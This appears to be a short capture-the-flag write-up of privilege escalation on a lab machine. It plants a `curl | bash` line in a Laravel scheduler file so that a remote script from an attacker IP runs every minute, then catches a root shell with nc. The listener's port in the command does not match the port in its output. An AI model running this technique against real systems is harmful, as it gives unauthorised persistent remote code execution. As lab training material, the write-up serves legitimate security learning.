# Discovery
```bash
$ cat /etc/crontab
...
* * * * * root php /var/www/laravel/artisan schedule:run
...
```

# Laravel task scheduling
laravel schdules tasks in /var/www/laravel/app/Console/Kernel.php
add the line
```php
$schedule->exec('curl -s 10.10.14.28/shell.sh | bash')->everyMinute()
```
to the file
and
```bash
$ nc -lvnp 6969
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.10.13.
Ncat: Connection from 10.10.10.13:41796.
bash: cannot set terminal process group (1379): Inappropriate ioctl for device
bash: no job control in this shell
root@cronos:/var/www/admin$ 
```